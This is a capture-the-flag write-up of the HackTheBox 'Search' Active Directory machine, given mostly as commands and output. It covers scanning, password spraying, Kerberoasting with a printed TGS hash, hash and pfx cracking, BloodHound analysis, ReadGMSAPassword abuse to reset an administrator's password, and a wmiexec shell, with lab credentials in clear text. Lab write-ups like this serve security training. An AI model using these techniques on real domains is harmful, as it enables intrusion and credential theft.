---
layout: single
title: HackTheBox - Search
date: 2022-5-4
classes: wide
header:
  teaser: /assets/images/images/slae32.png
categories:
  - HTB
  - Hard
tags:
  - Information Leakage
  - RPC enumeration
  - Password in photo?(realistic)
  - Ldap enumeration
  - BloodHound enumeration kerberoasting attack
  - Using pfx certifications
  - Web Powershell
  - Abusing ReadGMSAPassword
---
I start with nmap scanning open ports in the machine, take all open ports and then making a more exaustive scan.

```console
nmap --open -p- -sS --min-rate 4000 -vvv -n -Pn -oG allPorts 10.10.11.129
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 10:03 UTC
Initiating SYN Stealth Scan at 10:03
Scanning 10.10.11.129 [65535 ports]
Discovered open port 135/tcp on 10.10.11.129
Discovered open port 443/tcp on 10.10.11.129
Discovered open port 139/tcp on 10.10.11.129
Discovered open port 80/tcp on 10.10.11.129
Discovered open port 53/tcp on 10.10.11.129
Discovered open port 445/tcp on 10.10.11.129
Discovered open port 53433/tcp on 10.10.11.129
Discovered open port 49669/tcp on 10.10.11.129
Discovered open port 389/tcp on 10.10.11.129
Discovered open port 9389/tcp on 10.10.11.129
Discovered open port 3268/tcp on 10.10.11.129
Discovered open port 49691/tcp on 10.10.11.129
Discovered open port 49670/tcp on 10.10.11.129
Discovered open port 3269/tcp on 10.10.11.129
Discovered open port 49702/tcp on 10.10.11.129
Discovered open port 49667/tcp on 10.10.11.129
Discovered open port 593/tcp on 10.10.11.129
Discovered open port 464/tcp on 10.10.11.129
Discovered open port 88/tcp on 10.10.11.129
Discovered open port 636/tcp on 10.10.11.129
Discovered open port 8172/tcp on 10.10.11.129
Discovered open port 49727/tcp on 10.10.11.129
```
now lets scan more deeply these ports we found to use some basic scripts and see the version they using.
```console
which extractPorts | bat -l bash
extractPorts () {
   2   │     ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
   3   │     ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
   4   │     echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
   5   │     echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
   6   │     echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
   7   │     echo $ports | tr -d '\n' | xclip -sel clip
   8   │     echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
   9   │     bat extractPorts.tmp
  10   │     rm extractPorts.tmp
  11   │ }

```
I have these utility that extract all the importan information and copy the ports to the clipboard.
So now with all the ports copied we do the scan.
```colsone
nmap -sCV -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389,49666,49669,49670,49692,49703,49727 -oN targeted 10.10.11.129
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 10:08 UTC
Nmap scan report for search.htb (10.10.11.129)
Host is up (0.044s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
|_http-title: Search &mdash; Just Testing IIS
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-07 10:27:54Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-05-07T10:29:24+00:00; +19m18s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
443/tcp   open     ssl/http      Microsoft IIS httpd 10.0
|_http-title: Search &mdash; Just Testing IIS
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: 2022-05-07T10:29:24+00:00; +19m18s from scanner time.
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-05-07T10:29:24+00:00; +19m18s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-05-07T10:29:24+00:00; +19m18s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-05-07T10:29:24+00:00; +19m18s from scanner time.
8172/tcp  open     ssl/http      Microsoft IIS httpd 10.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2022-05-07T10:29:24+00:00; +19m18s from scanner time.
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
9389/tcp  open     mc-nmf        .NET Message Framing
49666/tcp filtered unknown
49669/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open     msrpc         Microsoft Windows RPC
49692/tcp filtered unknown
49703/tcp filtered unknown
49727/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-05-07T10:28:45
|_  start_date: N/A
|_clock-skew: mean: 19m17s, deviation: 0s, median: 19m17s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

```
We see a lot of ports so we start with basic recognizement
```console
   /home/h/De/h4rticx/HTB/search/nmap    smbmap -u "" -H 10.10.11.129 --no-banner
                                                                                                    
[+] IP: 10.10.11.129:445	Name: search.htb          	Status: Authenticated
[!] Something weird happened: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied}

   ~/De/h4rticx/HTB/search/nmap  took  4s  crackmapexec smb 10.10.11.129

SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
   ~/Desktop/h4rticx/HTB/search/nmap  rpcclient -U "" 10.10.11.129 -N -c 'enumdomusers'
result was NT_STATUS_ACCESS_DENIED
```
We cant connect to smb with null session but see domain name search.htb so we add it in /etc/hosts, check rdp with null session but access denied, so we go check the web.
Analycing the web i notice a weird image, so i check it up in a new tab with more zoom.
![image found](/assets/images/weird.png)
Found Hope sharp and password "IsolationIsKey?" so because i dont know the user i make a list with posible users.
![image user](/assets/images/hopesharpuser.png)
And the try with crackmapexec who is the good one.
```console
    ~/Desktop/h4rticx/HTB/search/content  crackmapexec smb 10.10.11.129 -u users.txt -p "IsolationIsKey?"
 SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hopesharp:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\h.sharp:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hope.s:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
```
hope.sharp is the correct user so we try get more info with rpd and sbm now we have credentials.
```console
❯ smbmap -u 'hope.sharp' -p 'IsolationIsKey?' -H 10.10.11.129 -r 'RedirectedFolders$' --no-banner
                                                                                                    
[+] IP: 10.10.11.129:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	RedirectedFolders$                                	READ, WRITE	
	.\RedirectedFolders$\\*
	dr--r--r--                0 Sat May  7 10:58:10 2022	.
	dr--r--r--                0 Sat May  7 10:58:10 2022	..
	dr--r--r--                0 Tue Apr  7 18:12:58 2020	abril.suarez
	dr--r--r--                0 Fri Jul 31 13:11:32 2020	Angie.Duffy
	dr--r--r--                0 Fri Jul 31 12:35:32 2020	Antony.Russo
	dr--r--r--                0 Tue Apr  7 18:32:31 2020	belen.compton
	dr--r--r--                0 Fri Jul 31 12:37:36 2020	Cameron.Melendez
	dr--r--r--                0 Tue Apr  7 18:15:09 2020	chanel.bell
	dr--r--r--                0 Fri Jul 31 13:09:07 2020	Claudia.Pugh
	dr--r--r--                0 Fri Jul 31 12:02:04 2020	Cortez.Hickman
	dr--r--r--                0 Tue Apr  7 18:20:08 2020	dax.santiago
	dr--r--r--                0 Fri Jul 31 11:55:34 2020	Eddie.Stevens
	dr--r--r--                0 Thu Apr  9 20:04:11 2020	edgar.jacobs
	dr--r--r--                0 Fri Jul 31 12:39:50 2020	Edith.Walls
	dr--r--r--                0 Tue Apr  7 18:23:13 2020	eve.galvan
	dr--r--r--                0 Tue Apr  7 18:29:22 2020	frederick.cuevas
	dr--r--r--                0 Thu Apr  9 14:34:41 2020	hope.sharp
	dr--r--r--                0 Tue Apr  7 18:07:00 2020	jayla.roberts
	dr--r--r--                0 Fri Jul 31 13:01:06 2020	Jordan.Gregory
	dr--r--r--                0 Thu Apr  9 20:11:39 2020	payton.harmon
	dr--r--r--                0 Fri Jul 31 11:44:32 2020	Reginald.Morton
	dr--r--r--                0 Tue Apr  7 18:10:25 2020	santino.benjamin
	dr--r--r--                0 Fri Jul 31 12:21:42 2020	Savanah.Velazquez
	dr--r--r--                0 Thu Nov 18 01:01:45 2021	sierra.frye
	dr--r--r--                0 Thu Apr  9 20:14:26 2020	trace.ryan
❯ smbmap -u 'hope.sharp' -p 'IsolationIsKey?' -H 10.10.11.129 -r 'RedirectedFolders$/hope.sharp' --no-banner
                                                                                                    
[+] IP: 10.10.11.129:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	RedirectedFolders$                                	READ, WRITE	
	.\RedirectedFolders$\hope.sharp\*
	dr--r--r--                0 Thu Apr  9 14:34:41 2020	.
	dr--r--r--                0 Thu Apr  9 14:34:41 2020	..
	dw--w--w--                0 Thu Apr  9 14:35:49 2020	Desktop
	dw--w--w--                0 Thu Apr  9 14:35:50 2020	Documents
	dw--w--w--                0 Thu Apr  9 14:35:49 2020	Downloads
❯ smbmap -u 'hope.sharp' -p 'IsolationIsKey?' -H 10.10.11.129 -r 'RedirectedFolders$/hope.sharp/Desktop' --no-banner
                                                                                                    
[+] IP: 10.10.11.129:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	RedirectedFolders$                                	READ, WRITE	
	.\RedirectedFolders$\hope.sharp\Desktop\*
	dw--w--w--                0 Thu Apr  9 14:35:49 2020	.
	dw--w--w--                0 Thu Apr  9 14:35:49 2020	..
	dr--r--r--                0 Thu Apr  9 14:35:49 2020	$RECYCLE.BIN
	fr--r--r--              282 Thu Apr  9 14:35:00 2020	desktop.ini
	fr--r--r--             1450 Thu Apr  9 14:35:38 2020	Microsoft Edge.lnk
❯ smbmap -u 'hope.sharp' -p 'IsolationIsKey?' -H 10.10.11.129 -r 'RedirectedFolders$/hope.sharp/Downloads' --no-banner
                                                                                                    
[+] IP: 10.10.11.129:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	RedirectedFolders$                                	READ, WRITE	
	.\RedirectedFolders$\hope.sharp\Downloads\*
	dw--w--w--                0 Thu Apr  9 14:35:49 2020	.
	dw--w--w--                0 Thu Apr  9 14:35:49 2020	..
	dr--r--r--                0 Thu Apr  9 14:35:49 2020	$RECYCLE.BIN
	fr--r--r--              282 Thu Apr  9 14:35:02 2020	desktop.ini 
```
Nothing found in smb so we go to rpd
```console
❯ rpcclient -U 'hope.sharp%IsolationIsKey?' 10.10.11.129 -c 'enumdomusers'
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Santino.Benjamin] rid:[0x4aa]
user:[Payton.Harmon] rid:[0x4ab]
user:[Trace.Ryan] rid:[0x4ac]
....
```
A lot of stuff so we filter what is inside of [] and save it in users.txt
```console
   ~/Desktop/h4rticx/HTB/search/content  rpcclient -U 'hope.sharp%IsolationIsKey?' 10.10.11.129 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > users.txt
```
We try if some user in the list is vulnerable to ASREPRoast attack
```colsone
❯ GetNPUsers.py -usersfile users.txt search.htb/
```
But is not vulnerable. So i tried kerberoasting attack and gaining a TGS with the authentication i have.
```console
❯ GetUserSPNs.py search.htb/hope.sharp
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
---------------------------------  -------  --------  --------------------------  --------------------------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 12:59:11.329031  2022-05-06 18:41:52.306143
```
And boom "web_svc" seems to be vulnerable so i get his hash.
```console
❯ GetUserSPNs.py search.htb/hope.sharp -request
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
---------------------------------  -------  --------  --------------------------  --------------------------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 12:59:11.329031  2022-05-06 18:41:52.306143             



[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
But we get that error because we need to syncronice with the server so i use ntpdate.
```console
❯ sudo ntpdate 10.10.11.129
 7 May 11:19:40 ntpdate[19962]: step time server 10.10.11.129 offset +1158.214479 sec

❯ GetUserSPNs.py search.htb/hope.sharp -request
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
---------------------------------  -------  --------  --------------------------  --------------------------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 12:59:11.329031  2022-05-06 18:41:52.306143             



$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$9e9223c971dd5d99875ca1dfd979cdb5$be9aa0663b5a5258e3371cc721487558a29e1a7446ac00114bb66d9f6025fe8b8ffd9aba5c7207f11f50d57cff62bef2e877ec2c122cb6f9444173dd986cee43211782715a0b799d3d220b25999709091b84abc0968bcaa184b00b10325e5ed10f91f90985b90d70fd9997fdcb4923d38be82415e04846fc408015e61f49ae0e0b6efa3da9d92d5c588c076245803f87da74e7384119cb786b3a21c6bd661583c3d35c909108e94a1f6f2bd7e8f3d75e6861a180baaee0dbbccede47dbc7246f031df6891fbce5c48634017c80e66ebca74624b76a39ca18187a01a2b7afc4e21174b1f2e8323c83ee69271c776434743d4da46f6f42c1f65c36ac34eb5d6229e532c2dd6d808db2ceede45d9fe0c8183ca8460f54513ac5d2175776a3372df430c98ef1c8f88adb67a0b85b0190c79ed65f572cb54180eb2c1b0602a2663c950b71b8b71fb1dde35906f7e5917fde41328cab3351545094db7748f23b528cf8781ceb172d9ef361f237bbb4a6f898f3cc46a5ced33e628d82f915f9e145e3b92815abb1aebcc0c426f505cd41146c680d79805ee4aeca3a929438ea26ab48dd38def71da5a54c21e9f8f66cef939cd157992fae652277abfc05ea1e21a6bfacac7c7d5471547fcf5344517ff9860dace2d13a7a8f94ac1d420c2a8dc5e6008a768d2a281f9ff08c9b5ebb5ac1b12f37ec73792e3735634f13ebe77c2c1acec457d138c7bb7a286317e24c3f25dad05260ca9ddcf5bb4fad527bd9a9ec8980440bc18fe626381ab003cbdbeeec54429f40dc382e0bdb99a13c99a2d28c4e9e4191d0878a110e3e714d229009ca8391951dede95ef9f1d9e9b36d7800cdd23a959b6d3930d120d575e416dafac32e4647586731fb0c01c1b8f62e75f8eb0e14d3c31dc3fd584a7274d75590ead52a9fa84390d52810bbd611f2d985ecb5f13a1c210d9e9aa631a757f231b520095ff090da11f815cef615dcd08721d0b87d59c2c87b6385b23300566cc7d97e81ff2db689aeb31b22109c801b1e1d5ce79167aa4fb4d1718299e83c065f64baf2e67529b9d13bf1c54cfd4bcd307ed4b3f988ea2a13c503e8b8193e197db90c8b0ad4b56b5db022c392403ecd6b76b24440f5ec4936c4608f346490d26709e132aced32a51e458e459ce52aadf9b836e34938f0a1d31c0c3b64840df4a5772574fca2ec5bc39d23be737a7ea9ff22a67eeeb1fd324f1e91a7cd5f065490318747aedc8a1d67d145d10c44cc2b5fe92fc69f9545bb2594dfa26e44f80643eccaf0aaa663ba48fda3ba023b7baf5b1700d9c5b1d9b78e7a5ad5f8cab24c37ccc50a31223f43b07245aa460932768a33524ff9cc7017d04247fe65680c930864dfe805be12458cd902b6d2106a9915b6d8374ad03cef5d0a7fd3f818891b95adb90dc2bf9f4c2c92bc75c029ff089bd7a7801b23de5ddfe95b2452d59babaf1ff329ba97901369c1b0e5

```
Use john to crack the password
```console
❯ john -w:/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
[archlinux:20199] [[34662,0],0] ORTE_ERROR_LOG: Data unpack would read past end of buffer in file util/show_help.c at line 501
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**************** (?)
1g 0:00:00:13 DONE (2022-05-07 11:21) 0.07412g/s 851764p/s 851764c/s 851764C/s @4208891ncv..@#alexandra$&
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Now try if other user in using the same password with crackmapexec
```console
❯ crackmapexec smb 10.10.11.129 -u users.txt -p "@3ONEmillionbaby" --continue-on-success
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Administrator:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Guest:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\krbtgt:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Santino.Benjamin:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Payton.Harmon:@3ONEmillionbaby STATUS_LOGON_FAILURE
.......
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Edgar.Jacobs:@3ONEmillionbaby 
```
Found edgar.jacobs with same credentials
```console 
❯ smbmap -u 'Edgar.Jacobs' -p '@3ONEmillionbaby' -H 10.10.11.129 -r 'RedirectedFolders$/edgar.jacobs/Desktop' --no-banner
                                                                                                    
[+] IP: 10.10.11.129:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	RedirectedFolders$                                	READ, WRITE	
	.\RedirectedFolders$\edgar.jacobs\Desktop\*
	dw--w--w--                0 Mon Aug 10 10:02:16 2020	.
	dw--w--w--                0 Mon Aug 10 10:02:16 2020	..
	dr--r--r--                0 Thu Apr  9 20:05:29 2020	$RECYCLE.BIN
	fr--r--r--              282 Mon Aug 10 10:02:16 2020	desktop.ini
	fr--r--r--             1450 Thu Apr  9 20:05:03 2020	Microsoft Edge.lnk
	fr--r--r--            23130 Mon Aug 10 10:30:05 2020	Phishing_Attempt.xlsx
```
Find Phishing_Attempt.xlsx in his home, weird so we download it.

![image libreoffice1](/assets/images/libreoffice1.png)
Column C seems to be hiden and we cant modify it, but if we decompress it we can change the code to get ride of the authorization.
```console
❯ ls
 10.10.11.129-RedirectedFolders_edgar.jacobs_Desktop_Phishing_Attempt.xlsx   hash
 credentials.txt                                                             users.txt
❯ mv 10.10.11.129-RedirectedFolders_edgar.jacobs_Desktop_Phishing_Attempt.xlsx phishing_attempt.xlsx
❯ libreoffice phishing_attempt.xlsx
^C
❯ ls
 credentials.txt   hash   phishing_attempt.xlsx   users.txt
❯ mkdir lb
❯ cd !$
cd lb
❯ mv ../phishing_attempt.xlsx .
❯ ls
 phishing_attempt.xlsx
❯ unzip phishing_attempt.xlsx
Archive:  phishing_attempt.xlsx
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/worksheets/sheet2.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/sharedStrings.xml    
  inflating: xl/drawings/drawing1.xml  
  inflating: xl/charts/chart1.xml    
  inflating: xl/charts/style1.xml    
  inflating: xl/charts/colors1.xml   
  inflating: xl/worksheets/_rels/sheet1.xml.rels  
  inflating: xl/worksheets/_rels/sheet2.xml.rels  
  inflating: xl/drawings/_rels/drawing1.xml.rels  
  inflating: xl/charts/_rels/chart1.xml.rels  
  inflating: xl/printerSettings/printerSettings1.bin  
  inflating: xl/printerSettings/printerSettings2.bin  
  inflating: xl/calcChain.xml        
  inflating: docProps/core.xml       
  inflating: docProps/app.xml        
❯ ls
 _rels   docProps   xl   [Content_Types].xml   phishing_attempt.xlsx
❯ nvim xl/worksheets/sheet2.xml
❯ ls
 _rels   docProps   xl   [Content_Types].xml   phishing_attempt.xlsx
❯ rm phishing_attempt.xlsx
❯ zip Documnt.xlsx -r .
  adding: _rels/ (stored 0%)
  adding: _rels/.rels (deflated 60%)
  adding: docProps/ (stored 0%)
  adding: docProps/core.xml (deflated 47%)
  adding: docProps/app.xml (deflated 52%)
  adding: [Content_Types].xml (deflated 79%)
  adding: xl/ (stored 0%)
  adding: xl/drawings/ (stored 0%)
  adding: xl/drawings/drawing1.xml (deflated 58%)
  adding: xl/drawings/_rels/ (stored 0%)
  adding: xl/drawings/_rels/drawing1.xml.rels (deflated 39%)
  adding: xl/printerSettings/ (stored 0%)
  adding: xl/printerSettings/printerSettings1.bin (deflated 67%)
  adding: xl/printerSettings/printerSettings2.bin (deflated 67%)
  adding: xl/charts/ (stored 0%)
  adding: xl/charts/colors1.xml (deflated 73%)
  adding: xl/charts/_rels/ (stored 0%)
  adding: xl/charts/_rels/chart1.xml.rels (deflated 49%)
  adding: xl/charts/chart1.xml (deflated 77%)
  adding: xl/charts/style1.xml (deflated 90%)
  adding: xl/sharedStrings.xml (deflated 55%)
  adding: xl/theme/ (stored 0%)
  adding: xl/theme/theme1.xml (deflated 80%)
  adding: xl/_rels/ (stored 0%)
  adding: xl/_rels/workbook.xml.rels (deflated 74%)
  adding: xl/calcChain.xml (deflated 55%)
  adding: xl/worksheets/ (stored 0%)
  adding: xl/worksheets/_rels/ (stored 0%)
  adding: xl/worksheets/_rels/sheet2.xml.rels (deflated 42%)
  adding: xl/worksheets/_rels/sheet1.xml.rels (deflated 55%)
  adding: xl/worksheets/sheet2.xml (deflated 73%)
  adding: xl/worksheets/sheet1.xml (deflated 79%)
  adding: xl/styles.xml (deflated 89%)
  adding: xl/workbook.xml (deflated 60%)
❯ ls
 _rels   docProps   xl   [Content_Types].xml   Documnt.xlsx
```
![image libreoffice2](/assets/images/libreoffice2.png)

Open the Document.xlsx and u have the credentials.

![image user](/assets/images/libreoffice3.png)
create credentials.txt with the creds and a user.txt with the users and use crackmapexec.
```console
❯ crackmapexec smb 10.10.11.129 -u user.txt -p credentials.txt --continue-on-success --no-bruteforce
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Payton.Harmon:;;36!cried!INDIA!year!50;; STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cortez.Hickman:..10-time-TALK-proud-66.. STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Bobby.Wolf:??47^before^WORLD^surprise^91?? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Margaret.Robinson://51+mountain+DEAR+noise+83// STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Scarlett.Parks:++47|building|WARSAW|gave|60++ STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eliezer.Jordan:!!05_goes_SEVEN_offer_83!! STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Hunter.Kirby:~~27%when%VILLAGE%full%00~~ STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Annabelle.Wells:==95~pass~QUIET~austria~77== STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eve.Galvan://61!banker!FANCY!measure!25// STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Jeramiah.Fritz:??40:student:MAYOR:been:66?? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Abby.Gonzalez:&&75:major:RADIO:state:93&& STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Joy.Costa:**30*venus*BALL*office*42** STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Vincent.Sutton:**24&moment&BRAZIL&members&6
```
Found that Sierra.Fry has a correct password so we try smbmap to see if she had Something in his Desktop
```console
❯ smbmap -u 'sierra.frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -H 10.10.11.129  -r 'RedirectedFolders$/sierra.frye/Downloads/Backups' --no-banner
                                                                                                    
[+] IP: 10.10.11.129:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	RedirectedFolders$                                	READ, WRITE	
	.\RedirectedFolders$\sierra.frye\Downloads\Backups\*
	dr--r--r--                0 Mon Aug 10 20:39:17 2020	.
	dr--r--r--                0 Mon Aug 10 20:39:17 2020	..
	fr--r--r--             2643 Fri Jul 31 15:04:11 2020	search-RESEARCH-CA.p12
	fr--r--r--             4326 Mon Aug 10 20:39:17 2020	staff.pfx
```
Find backups with some pfx files, tried download it and need a password to import it in browser. So with pfx2john get hash and crack it.
Then import the certs to the browser.

![image certs](/assets/images/certs.png)
But we dont know why we need the certs for, so we do fuzzing to found a page to use it.
```console
wfuzz -c -t 200 --hh=44982 --hc=404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://search.htb/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://search.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                      
=====================================================================

000000016:   301        1 L      10 W       148 Ch      "images"                                     
000000203:   301        1 L      10 W       148 Ch      "Images"                                     
000000245:   403        29 L     92 W       1233 Ch     "staff"                                      
000000550:   301        1 L      10 W       145 Ch      "css"                                        
000000953:   301        1 L      10 W       144 Ch      "js"                                         
000002771:   301        1 L      10 W       147 Ch      "fonts"                                      
000002614:   403        29 L     92 W       1233 Ch     "Staff"
```
found staff route with 403. Lets inspect that.
![image certs](/assets/images/staffpage.png)
We try the sierra credentials and we are in.
Now its time to use BloodHound, so first we use BloodHound-python and with the credentials we have we recollect all information.
```console
❯ python3 bloodhound.py -u 'hope.sharp' -p 'IsolationIsKey?' -d search.htb -ns 10.10.11.129 -c ALL
INFO: Found AD domain: search.htb
INFO: Connecting to LDAP server: research.search.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 113 computers
INFO: Connecting to LDAP server: research.search.htb
INFO: Found 107 users
INFO: Found 64 groups
INFO: Found 0 trusts
.....
```
Import the files we get to the bloodhound and we mark the users we pwnd ass owned.
then we click on short path to get domain admin and we get Something like this:
![image certs](/assets/images/bloodhound1.png)
Now you can see in the bloodhound that you can gain access to BIR-ADFS-GMSA via ReadGMSAPassword so in this page is explained perfectly
[Link Text]([https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/])
So lets follow the instructions.
![image certs](/assets/images/powershell1.png)
```console
   ~/Desktop/h4rticx/HTB/search/content  crackmapexec smb 10.10.11.129 -u 'tristan.davies' -p 'h4rticx123'
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\tristan.davies:h4rticx123 (Pwn3d!)
```
And pwned, thats it.
Time to connect via wmiexec
```console
❯ wmiexec.py search.htb/tristan.davies@10.10.11.129
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
C:\>whoami
